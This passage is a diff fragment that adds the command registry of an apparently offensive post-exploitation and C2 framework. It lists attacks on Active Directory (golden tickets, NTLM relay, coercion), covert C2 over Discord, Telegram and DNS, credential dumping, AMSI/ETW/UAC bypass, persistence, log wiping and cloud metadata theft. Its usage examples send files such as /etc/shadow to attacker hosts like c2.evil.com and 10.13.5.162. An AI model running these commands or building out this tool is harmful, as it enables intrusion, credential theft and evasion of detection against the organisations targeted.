+        {"name": "filter", "type": "string", "required": false, "description": "Group name filter or keyword"}
+      ],
+      "examples": ["ad_groups", "ad_groups 'Domain Admins'"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_computers": {
+      "category": "ad",
+      "description": "Enumerate AD computer objects: OS versions, unconstrained delegation, LAPS-enabled machines",
+      "usage": "ad_computers [filter]",
+      "args": [
+        {"name": "filter", "type": "string", "required": false, "description": "Hostname filter or keyword (e.g. 'server', 'dc', 'win10')"}
+      ],
+      "examples": ["ad_computers", "ad_computers dc", "ad_computers 'Windows Server 2019'"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_spns": {
+      "category": "ad",
+      "description": "Enumerate Service Principal Names for Kerberoasting attacks. Finds user accounts with SPNs set.",
+      "usage": "ad_spns",
+      "args": [],
+      "examples": ["ad_spns"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_delegation": {
+      "category": "ad",
+      "description": "Find accounts with unconstrained, constrained, or resource-based constrained delegation configured",
+      "usage": "ad_delegation [type]",
+      "args": [
+        {"name": "type", "type": "string", "required": false, "description": "Filter by delegation type: 'unconstrained', 'constrained', or 'rbcd'"}
+      ],
+      "examples": ["ad_delegation", "ad_delegation unconstrained", "ad_delegation rbcd"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_rbcd": {
+      "category": "ad",
+      "description": "Resource-Based Constrained Delegation attack: configure msDS-AllowedToActOnBehalfOfOtherIdentity to impersonate users",
+      "usage": "ad_rbcd <target_computer> <controlled_account>",
+      "args": [
+        {"name": "target_computer", "type": "string", "required": true, "description": "Computer account to configure RBCD on (e.g. DC01$)"},
+        {"name": "controlled_account", "type": "string", "required": true, "description": "Account you control that will be allowed to delegate"}
+      ],
+      "examples": ["ad_rbcd DC01$ YOURPC$", "ad_rbcd WEB01$ fakecomputer$"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_shadow_creds": {
+      "category": "ad",
+      "description": "Shadow Credentials attack: add a Key Credential to a target's msDS-KeyCredentialLink for PKINIT authentication",
+      "usage": "ad_shadow_creds <target>",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "Target account (user or computer) to add shadow credentials to"}
+      ],
+      "examples": ["ad_shadow_creds DC01$", "ad_shadow_creds admin"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_adcs": {
+      "category": "ad",
+      "description": "Enumerate Active Directory Certificate Services: find vulnerable certificate templates (ESC1-ESC8), CAs, and enrollment rights",
+      "usage": "ad_adcs [check]",
+      "args": [
+        {"name": "check", "type": "string", "required": false, "description": "Specific ESC check to run (e.g. 'esc1', 'esc4', 'esc8'). Runs all if omitted."}
+      ],
+      "examples": ["ad_adcs", "ad_adcs esc1", "ad_adcs esc8"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_laps": {
+      "category": "ad",
+      "description": "Read LAPS (Local Administrator Password Solution) passwords from AD. Requires read access to ms-Mcs-AdmPwd attribute.",
+      "usage": "ad_laps [computer]",
+      "args": [
+        {"name": "computer", "type": "string", "required": false, "description": "Specific computer name to query. Reads all accessible if omitted."}
+      ],
+      "examples": ["ad_laps", "ad_laps WEB01"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_gmsa": {
+      "category": "ad",
+      "description": "Read Group Managed Service Account (gMSA) passwords from AD. Extracts msDS-ManagedPassword if accessible.",
+      "usage": "ad_gmsa [account]",
+      "args": [
+        {"name": "account", "type": "string", "required": false, "description": "Specific gMSA account name. Lists all gMSA accounts if omitted."}
+      ],
+      "examples": ["ad_gmsa", "ad_gmsa svc_sql$"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_dacl": {
+      "category": "ad",
+      "description": "Enumerate Discretionary Access Control Lists on AD objects. Find GenericAll, WriteDACL, WriteOwner, and other abusable permissions.",
+      "usage": "ad_dacl <target>",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "Target AD object (user, group, computer, OU) to analyze"}
+      ],
+      "examples": ["ad_dacl 'Domain Admins'", "ad_dacl DC01$", "ad_dacl administrator"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_gpo": {
+      "category": "ad",
+      "description": "Enumerate Group Policy Objects: find GPOs with immediate impact, writable GPOs, GPO links, and password policies in GPP",
+      "usage": "ad_gpo [filter]",
+      "args": [
+        {"name": "filter", "type": "string", "required": false, "description": "GPO name filter or keyword"}
+      ],
+      "examples": ["ad_gpo", "ad_gpo 'Default Domain'"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_coerce": {
+      "category": "ad",
+      "description": "Coerce authentication from target machine accounts using PetitPotam, PrinterBug, DFSCoerce, or ShadowCoerce",
+      "usage": "ad_coerce <target> <listener> [method]",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "Target host to coerce authentication from"},
+        {"name": "listener", "type": "string", "required": true, "description": "Listener IP to capture the authentication"},
+        {"name": "method", "type": "string", "required": false, "description": "Coercion method: 'petitpotam', 'printerbug', 'dfscoerce', 'shadowcoerce' (default: try all)"}
+      ],
+      "examples": ["ad_coerce dc01 10.13.5.162", "ad_coerce dc01 10.13.5.162 petitpotam"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_ntlm_relay": {
+      "category": "ad",
+      "description": "Set up NTLM relay attack: relay captured NTLM authentication to target services (LDAP, SMB, HTTP, MSSQL)",
+      "usage": "ad_ntlm_relay <target> [protocol]",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "Target URL or host to relay authentication to"},
+        {"name": "protocol", "type": "string", "required": false, "description": "Target protocol: 'ldap', 'ldaps', 'smb', 'http', 'mssql' (default: ldap)"}
+      ],
+      "examples": ["ad_ntlm_relay ldap://dc01", "ad_ntlm_relay smb://10.0.0.5 smb"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_golden_ticket": {
+      "category": "ad",
+      "description": "Forge a Golden Ticket using the krbtgt NTLM hash for domain-wide persistence",
+      "usage": "ad_golden_ticket <domain> <domain_sid> <krbtgt_hash> [user]",
+      "args": [
+        {"name": "domain", "type": "string", "required": true, "description": "Domain FQDN (e.g. corp.local)"},
+        {"name": "domain_sid", "type": "string", "required": true, "description": "Domain SID (e.g. S-1-5-21-...)"},
+        {"name": "krbtgt_hash", "type": "string", "required": true, "description": "NTLM hash of the krbtgt account"},
+        {"name": "user", "type": "string", "required": false, "description": "Username to impersonate (default: Administrator)"}
+      ],
+      "examples": ["ad_golden_ticket corp.local S-1-5-21-123456-7890 aad3b435b51404eeaad3b435b51404ee"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+    "ad_silver_ticket": {
+      "category": "ad",
+      "description": "Forge a Silver Ticket using a service account's NTLM hash for targeted service access",
+      "usage": "ad_silver_ticket <domain> <domain_sid> <service_hash> <spn> [user]",
+      "args": [
+        {"name": "domain", "type": "string", "required": true, "description": "Domain FQDN"},
+        {"name": "domain_sid", "type": "string", "required": true, "description": "Domain SID"},
+        {"name": "service_hash", "type": "string", "required": true, "description": "NTLM hash of the service account"},
+        {"name": "spn", "type": "string", "required": true, "description": "Target SPN (e.g. CIFS/dc01.corp.local)"},
+        {"name": "user", "type": "string", "required": false, "description": "Username to impersonate (default: Administrator)"}
+      ],
+      "examples": ["ad_silver_ticket corp.local S-1-5-21-123456-7890 aad3b435... CIFS/dc01.corp.local"],
+      "agents": ["python", "csharp", "go", "powershell"]
+    },
+
+    "c2_http": {
+      "category": "c2",
+      "description": "Set up HTTP-based command and control channel. Supports beaconing, jitter, and encrypted payloads.",
+      "usage": "c2_http <url> [interval] [jitter]",
+      "args": [
+        {"name": "url", "type": "string", "required": true, "description": "C2 server URL (e.g. http://attacker/api)"},
+        {"name": "interval", "type": "integer", "required": false, "description": "Beacon interval in seconds (default: 30)"},
+        {"name": "jitter", "type": "integer", "required": false, "description": "Jitter percentage 0-100 (default: 20)"}
+      ],
+      "examples": ["c2_http http://10.13.5.162:8080/api", "c2_http https://c2.evil.com/beacon 60 30"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "c2_discord": {
+      "category": "c2",
+      "description": "Use Discord webhook/bot as a covert C2 channel for command execution and data exfiltration",
+      "usage": "c2_discord <webhook_url|bot_token> [channel_id]",
+      "args": [
+        {"name": "endpoint", "type": "string", "required": true, "description": "Discord webhook URL or bot token"},
+        {"name": "channel_id", "type": "string", "required": false, "description": "Discord channel ID (required for bot token mode)"}
+      ],
+      "examples": ["c2_discord https://discord.com/api/webhooks/123/abc"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "c2_telegram": {
+      "category": "c2",
+      "description": "Use Telegram bot API as a covert C2 channel for command execution and data exfiltration",
+      "usage": "c2_telegram <bot_token> <chat_id>",
+      "args": [
+        {"name": "bot_token", "type": "string", "required": true, "description": "Telegram bot token from @BotFather"},
+        {"name": "chat_id", "type": "string", "required": true, "description": "Telegram chat/group ID to communicate through"}
+      ],
+      "examples": ["c2_telegram 123456:ABC-DEF 987654321"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "c2_beacon": {
+      "category": "c2",
+      "description": "Generic beacon mode: periodically check in with C2 server, execute queued commands, report results",
+      "usage": "c2_beacon <server> [interval]",
+      "args": [
+        {"name": "server", "type": "string", "required": true, "description": "C2 server address (host:port or URL)"},
+        {"name": "interval", "type": "integer", "required": false, "description": "Check-in interval in seconds (default: 60)"}
+      ],
+      "examples": ["c2_beacon 10.13.5.162:4443", "c2_beacon https://c2.evil.com 120"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "c2_dns": {
+      "category": "c2",
+      "description": "DNS-based C2 channel: encode commands and responses in DNS TXT/CNAME queries for firewall evasion",
+      "usage": "c2_dns <domain> [nameserver] [record_type]",
+      "args": [
+        {"name": "domain", "type": "string", "required": true, "description": "Controlled domain for DNS C2 (e.g. c2.evil.com)"},
+        {"name": "nameserver", "type": "string", "required": false, "description": "Custom nameserver to route DNS queries through"},
+        {"name": "record_type", "type": "string", "required": false, "description": "DNS record type to use: 'TXT', 'CNAME', 'A', 'AAAA' (default: TXT)"}
+      ],
+      "examples": ["c2_dns c2.evil.com", "c2_dns cmd.evil.com 8.8.8.8 CNAME"],
+      "agents": ["python", "csharp", "go"]
+    },
+
+    "exfil": {
+      "category": "exfil",
+      "description": "Exfiltrate data from the target via multiple methods: HTTP POST, DNS, ICMP, or file copy",
+      "usage": "exfil <file_or_dir> [method] [destination]",
+      "args": [
+        {"name": "path", "type": "path", "required": true, "description": "File or directory to exfiltrate"},
+        {"name": "method", "type": "string", "required": false, "description": "Exfil method: 'http', 'dns', 'icmp', 'smb', 'scp' (default: http)"},
+        {"name": "destination", "type": "string", "required": false, "description": "Destination URL, host, or path depending on method"}
+      ],
+      "examples": ["exfil /tmp/loot.tar.gz", "exfil /etc/shadow http http://10.13.5.162:8080/upload", "exfil /tmp/data dns t.evil.com"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "compress": {
+      "category": "exfil",
+      "description": "Compress files or directories for exfiltration (tar.gz, zip, or gzip)",
+      "usage": "compress <path> [output] [format]",
+      "args": [
+        {"name": "path", "type": "path", "required": true, "description": "File or directory to compress"},
+        {"name": "output", "type": "string", "required": false, "description": "Output filename (auto-generated if omitted)"},
+        {"name": "format", "type": "string", "required": false, "description": "Compression format: 'tar.gz', 'zip', 'gzip' (default: tar.gz)"}
+      ],
+      "examples": ["compress /home/user/Documents", "compress /tmp/loot /tmp/loot.zip zip"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "auto_root": {
+      "category": "automation",
+      "description": "Automated privilege escalation pipeline: runs vuln_scan, exploit_suggest, privesc_check, then attempts privesc_auto",
+      "usage": "auto_root",
+      "args": [],
+      "examples": ["auto_root"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "auto_pivot": {
+      "category": "automation",
+      "description": "Automated network pivoting: discover internal subnets, scan for live hosts, set up SOCKS proxy and port forwards",
+      "usage": "auto_pivot [subnet]",
+      "args": [
+        {"name": "subnet", "type": "string", "required": false, "description": "Target subnet (auto-detected from interfaces if omitted)"}
+      ],
+      "examples": ["auto_pivot", "auto_pivot 10.10.10.0/24"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "auto_persist": {
+      "category": "automation",
+      "description": "Automated persistence: detect writable locations and install the most appropriate persistence mechanisms",
+      "usage": "auto_persist",
+      "args": [],
+      "examples": ["auto_persist"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "auto_clean": {
+      "category": "automation",
+      "description": "Automated cleanup: remove all persistence, clean logs, timestomp modified files, self-destruct",
+      "usage": "auto_clean",
+      "args": [],
+      "examples": ["auto_clean"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "auto_report": {
+      "category": "automation",
+      "description": "Generate an operation report: summarize enumeration results, exploits used, credentials found, persistence installed",
+      "usage": "auto_report [output]",
+      "args": [
+        {"name": "output", "type": "path", "required": false, "description": "Output file path (default: /tmp/.report_<timestamp>)"}
+      ],
+      "examples": ["auto_report", "auto_report /tmp/op_report.txt"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "playbook_run": {
+      "category": "playbooks",
+      "description": "Execute a predefined attack playbook by name. Playbooks chain multiple commands into automated attack sequences.",
+      "usage": "playbook_run <name> [vars]",
+      "args": [
+        {"name": "name", "type": "string", "required": true, "description": "Playbook name (e.g. 'domain_takeover', 'web_pivot', 'ransim', 'full_enum')"},
+        {"name": "vars", "type": "string", "required": false, "description": "Comma-separated key=value variables for playbook parameterization"}
+      ],
+      "examples": ["playbook_run full_enum", "playbook_run domain_takeover dc=10.0.0.1,domain=corp.local", "playbook_run web_pivot target=10.10.10.5"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "playbook_list": {
+      "category": "playbooks",
+      "description": "List all available attack playbooks with brief descriptions",
+      "usage": "playbook_list",
+      "args": [],
+      "examples": ["playbook_list"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "playbook_show": {
+      "category": "playbooks",
+      "description": "Display the full details of a playbook: steps, required variables, expected output, and prerequisites",
+      "usage": "playbook_show <name>",
+      "args": [
+        {"name": "name", "type": "string", "required": true, "description": "Playbook name to display details for"}
+      ],
+      "examples": ["playbook_show domain_takeover", "playbook_show full_enum"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "background": {
+      "category": "jobs",
+      "description": "Run a command in the background as a managed job (requires proc_open)",
+      "usage": "background <command>",
+      "args": [
+        {"name": "command", "type": "string", "required": true, "description": "Command to run in the background"}
+      ],
+      "examples": ["background nmap -sS 10.0.0.0/24", "background python3 -m http.server 8000"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "fg": {
+      "category": "jobs",
+      "description": "Bring a background job to the foreground. Use Ctrl+C to send it back to background.",
+      "usage": "fg [job_id]",
+      "args": [
+        {"name": "job_id", "type": "integer", "required": false, "description": "Job ID from 'jobs' output. Defaults to most recent job."}
+      ],
+      "examples": ["fg", "fg 1"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "jobs": {
+      "category": "jobs",
+      "description": "List all background jobs with their PID, status, and command",
+      "usage": "jobs",
+      "args": [],
+      "examples": ["jobs"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "kill": {
+      "category": "jobs",
+      "description": "Kill a process by PID or a background job by %job_id",
+      "usage": "kill <PID|%job_id>",
+      "args": [
+        {"name": "target", "type": "string", "required": true, "description": "PID number or %job_id (e.g. %1) to kill"}
+      ],
+      "examples": ["kill 12345", "kill %1"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+
+    "token_impersonate": {
+      "category": "windows",
+      "description": "Impersonate a token from another process or use SeImpersonatePrivilege for privilege escalation (Potato-style attacks)",
+      "usage": "token_impersonate [pid|method]",
+      "args": [
+        {"name": "target", "type": "string", "required": false, "description": "PID to steal token from, or method: 'potato', 'printspoofer', 'godpotato' (default: auto-detect best method)"}
+      ],
+      "examples": ["token_impersonate", "token_impersonate 4", "token_impersonate potato"],
+      "agents": ["csharp", "powershell"]
+    },
+    "token_steal": {
+      "category": "windows",
+      "description": "Steal and duplicate an access token from a target process for impersonation",
+      "usage": "token_steal <pid>",
+      "args": [
+        {"name": "pid", "type": "integer", "required": true, "description": "Process ID to steal the token from"}
+      ],
+      "examples": ["token_steal 4", "token_steal 668"],
+      "agents": ["csharp", "powershell"]
+    },
+    "cred_dump": {
+      "category": "windows",
+      "description": "Dump credentials from LSASS, SAM, SECURITY hives, or cached credentials. Multiple methods: MiniDump, registry, nanodump.",
+      "usage": "cred_dump [method]",
+      "args": [
+        {"name": "method", "type": "string", "required": false, "description": "Dump method: 'lsass', 'sam', 'dcsync', 'cached', 'nanodump' (default: lsass)"}
+      ],
+      "examples": ["cred_dump", "cred_dump sam", "cred_dump dcsync"],
+      "agents": ["csharp", "powershell"]
+    },
+    "registry_read": {
+      "category": "windows",
+      "description": "Read Windows registry keys and values. Supports HKLM, HKCU, HKCR, HKU, HKCC hives.",
+      "usage": "registry_read <key_path> [value_name]",
+      "args": [
+        {"name": "key_path", "type": "string", "required": true, "description": "Full registry key path (e.g. HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion)"},
+        {"name": "value_name", "type": "string", "required": false, "description": "Specific value name to read. Lists all values if omitted."}
+      ],
+      "examples": ["registry_read HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "registry_read HKLM\\SAM\\SAM\\Domains"],
+      "agents": ["csharp", "powershell"]
+    },
+    "registry_write": {
+      "category": "windows",
+      "description": "Write or create Windows registry keys and values for persistence, configuration changes, or security policy modification",
+      "usage": "registry_write <key_path> <value_name> <value_data> [type]",
+      "args": [
+        {"name": "key_path", "type": "string", "required": true, "description": "Full registry key path"},
+        {"name": "value_name", "type": "string", "required": true, "description": "Registry value name to create or modify"},
+        {"name": "value_data", "type": "string", "required": true, "description": "Data to write to the registry value"},
+        {"name": "type", "type": "string", "required": false, "description": "Registry value type: 'REG_SZ', 'REG_DWORD', 'REG_BINARY', 'REG_EXPAND_SZ' (default: REG_SZ)"}
+      ],
+      "examples": ["registry_write HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run backdoor C:\\temp\\shell.exe"],
+      "agents": ["csharp", "powershell"]
+    },
+    "service_create": {
+      "category": "windows",
+      "description": "Create a Windows service for persistence or privilege escalation. Can run as SYSTEM.",
+      "usage": "service_create <name> <binary_path> [start_type]",
+      "args": [
+        {"name": "name", "type": "string", "required": true, "description": "Service name (use a legitimate-sounding name)"},
+        {"name": "binary_path", "type": "string", "required": true, "description": "Path to the service binary or command to execute"},
+        {"name": "start_type", "type": "string", "required": false, "description": "Start type: 'auto', 'demand', 'disabled' (default: auto)"}
+      ],
+      "examples": ["service_create WindowsUpdateSvc C:\\temp\\shell.exe auto", "service_create CacheSvc 'cmd /c C:\\temp\\beacon.exe'"],
+      "agents": ["csharp", "powershell"]
+    },
+    "uac_bypass": {
+      "category": "windows",
+      "description": "Bypass User Account Control using various techniques: fodhelper, eventvwr, computerdefaults, sdclt, cmstp, or DiskCleanup",
+      "usage": "uac_bypass <command> [method]",
+      "args": [
+        {"name": "command", "type": "string", "required": true, "description": "Command to execute with elevated privileges"},
+        {"name": "method", "type": "string", "required": false, "description": "Bypass method: 'fodhelper', 'eventvwr', 'computerdefaults', 'sdclt', 'cmstp', 'diskcleanup' (default: fodhelper)"}
+      ],
+      "examples": ["uac_bypass C:\\temp\\shell.exe", "uac_bypass 'powershell -ep bypass -f C:\\temp\\rev.ps1' eventvwr"],
+      "agents": ["csharp", "powershell"]
+    },
+    "amsi_bypass": {
+      "category": "windows",
+      "description": "Bypass Antimalware Scan Interface (AMSI) to allow execution of flagged PowerShell/C# payloads",
+      "usage": "amsi_bypass [method]",
+      "args": [
+        {"name": "method", "type": "string", "required": false, "description": "Bypass method: 'patch', 'reflection', 'hardware_bp', 'etw_patch' (default: patch)"}
+      ],
+      "examples": ["amsi_bypass", "amsi_bypass reflection"],
+      "agents": ["csharp", "powershell"]
+    },
+    "etw_bypass": {
+      "category": "windows",
+      "description": "Bypass Event Tracing for Windows (ETW) to prevent logging of .NET assembly loads and suspicious activities",
+      "usage": "etw_bypass [method]",
+      "args": [
+        {"name": "method", "type": "string", "required": false, "description": "Bypass method: 'patch', 'unhook', 'provider_disable' (default: patch)"}
+      ],
+      "examples": ["etw_bypass", "etw_bypass unhook"],
+      "agents": ["csharp", "powershell"]
+    },
+
+    "cloud_metadata": {
+      "category": "cloud",
+      "description": "Query cloud instance metadata services (AWS 169.254.169.254, GCP, Azure IMDS). Extract credentials, instance info, user-data scripts.",
+      "usage": "cloud_metadata [provider]",
+      "args": [
+        {"name": "provider", "type": "string", "required": false, "description": "Cloud provider: 'aws', 'gcp', 'azure', 'digitalocean' (default: auto-detect)"}
+      ],
+      "examples": ["cloud_metadata", "cloud_metadata aws", "cloud_metadata azure"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    },
+    "cloud_enum": {
+      "category": "cloud",
+      "description": "Enumerate cloud resources: S3 buckets, IAM roles, Azure subscriptions, GCP projects, storage accounts, key vaults",
+      "usage": "cloud_enum [provider] [scope]",
+      "args": [
+        {"name": "provider", "type": "string", "required": false, "description": "Cloud provider: 'aws', 'gcp', 'azure' (default: auto-detect)"},
+        {"name": "scope", "type": "string", "required": false, "description": "Enumeration scope: 'iam', 'storage', 'compute', 'network', 'all' (default: all)"}
+      ],
+      "examples": ["cloud_enum", "cloud_enum aws iam", "cloud_enum azure storage"],
+      "agents": ["php", "python", "csharp", "go", "powershell"]
+    }
+  },
+
+  "categories": {
+    "shell": {
+      "description": "Shell navigation and control",
+      "order": 1,
+      "commands": ["help", "cd", "pwd", "clear", "history", "pty", "alias", "mode", "capabilities", "exit"]
+    },
+    "files": {
+      "description": "File system operations",
+      "order": 2,
+      "commands": ["cat", "head", "tail", "ls", "upload", "download", "edit", "cp", "mv", "rm", "mkdir", "touch"]
+    },
+    "recon": {
+      "description": "System and network reconnaissance",
+      "order": 3,
+      "commands": ["sysinfo", "env", "services", "ports", "firewall", "netmap"]
+    },
+    "vuln": {
+      "description": "Vulnerability scanning and detection",
+      "order": 4,
+      "commands": ["vuln_scan"]
+    },
+    "exploits": {
+      "description": "Exploit management and compilation",
+      "order": 5,
+      "commands": ["exploit_suggest", "exploit_fetch", "exploit_compile"]
+    },
+    "privesc": {
+      "description": "Privilege escalation enumeration and exploitation",
+      "order": 6,
+      "commands": ["privesc_check", "privesc_auto", "privesc_suggest"]
+    },
+    "network": {
+      "description": "Network tools and port scanning",
+      "order": 7,
+      "commands": ["portscan", "connect", "listen", "bannergrab"]
+    },
+    "pivoting": {
+      "description": "Network pivoting and port forwarding",
+      "order": 8,
+      "commands": ["pivot_list", "pivot_portfwd", "pivot_socks", "pivot_tunnel"]
+    },
+    "tunneling": {
+      "description": "Advanced tunneling over non-standard protocols",
+      "order": 9,
+      "commands": ["dns_tunnel", "icmp_tunnel", "ws_tunnel", "pipe_tunnel", "ssh_tunnel"]
+    },
+    "persist": {
+      "description": "Persistence mechanisms for maintaining access",
+      "order": 10,
+      "commands": ["persist_all", "persist_cron", "persist_ssh", "persist_systemd", "persist_rc", "persist_motd", "persist_ldpreload", "persist_php", "persist_web"]
+    },
+    "evasion": {
+      "description": "Anti-forensics and detection evasion",
+      "order": 11,
+      "commands": ["clean_logs", "clean_self", "hide_process", "hide_connection", "timestomp", "alter_conn", "memory_only"]
+    },
+    "lateral": {
+      "description": "Lateral movement across the network",
+      "order": 12,
+      "commands": ["lateral_ssh", "lateral_scp", "lateral_wmi", "lateral_smb", "lateral_dcom", "lateral_winrm", "lateral_psremoting"]
+    },
+    "stealing": {
+      "description": "Credential harvesting and data theft",
+      "order": 13,
+      "commands": ["steal_all", "steal_configs", "steal_ssh", "steal_history", "steal_passwords", "steal_etc", "steal_browsers"]
+    },
+    "ad": {
+      "description": "Active Directory enumeration and attacks",
+      "order": 14,
+      "commands": ["ad_enum", "ad_users", "ad_groups", "ad_computers", "ad_spns", "ad_delegation", "ad_rbcd", "ad_shadow_creds", "ad_adcs", "ad_laps", "ad_gmsa", "ad_dacl", "ad_gpo", "ad_coerce", "ad_ntlm_relay", "ad_golden_ticket", "ad_silver_ticket"]
+    },
+    "c2": {
+      "description": "Command and control channels",
+      "order": 15,
+      "commands": ["c2_http", "c2_discord", "c2_telegram", "c2_beacon", "c2_dns"]
+    },
+    "exfil": {
+      "description": "Data exfiltration and compression",
+      "order": 16,
+      "commands": ["exfil", "compress"]
+    },
+    "automation": {
+      "description": "Automated attack pipelines",
+      "order": 17,
+      "commands": ["auto_root", "auto_pivot", "auto_persist", "auto_clean", "auto_report"]
+    },
+    "playbooks": {
+      "description": "Predefined attack playbook execution",
+      "order": 18,
+      "commands": ["playbook_run", "playbook_list", "playbook_show"]
+    },
+    "jobs": {
+      "description": "Background job management",
+      "order": 19,
+      "commands": ["background", "fg", "jobs", "kill"]
+    },
+    "windows": {
+      "description": "Windows-specific attacks and post-exploitation",
+      "order": 20,
+      "commands": ["token_impersonate", "token_steal", "cred_dump", "registry_read", "registry_write", "service_create", "uac_bypass", "amsi_bypass", "etw_bypass"]
+    },
+    "cloud": {
+      "description": "Cloud environment enumeration and exploitation",
+      "order": 21,
+      "commands": ["cloud_metadata", "cloud_enum"]
+    }
+  },
+
+  "meta": {
+    "total_commands": 103,
+    "total_categories": 21,
+    "agents": ["php", "python", "csharp", "go", "powershell"],
+    "new_in_v5": {
+      "tunneling": ["dns_tunnel", "icmp_tunnel", "ws_tunnel", "pipe_tunnel", "ssh_tunnel"],
+      "lateral": ["lateral_dcom", "lateral_winrm", "lateral_psremoting"],
+      "ad": ["ad_enum", "ad_users", "ad_groups", "ad_computers", "ad_spns", "ad_delegation", "ad_rbcd", "ad_shadow_creds", "ad_adcs", "ad_laps", "ad_gmsa", "ad_dacl", "ad_gpo", "ad_coerce", "ad_ntlm_relay", "ad_golden_ticket", "ad_silver_ticket"],
+      "c2": ["c2_dns"],
+      "playbooks": ["playbook_run", "playbook_list", "playbook_show"],
+      "windows": ["token_impersonate", "token_steal", "cred_dump", "registry_read", "registry_write", "service_create", "uac_bypass", "amsi_bypass", "etw_bypass"],
+      "cloud": ["cloud_metadata", "cloud_enum"]
+    }
+  }
+}
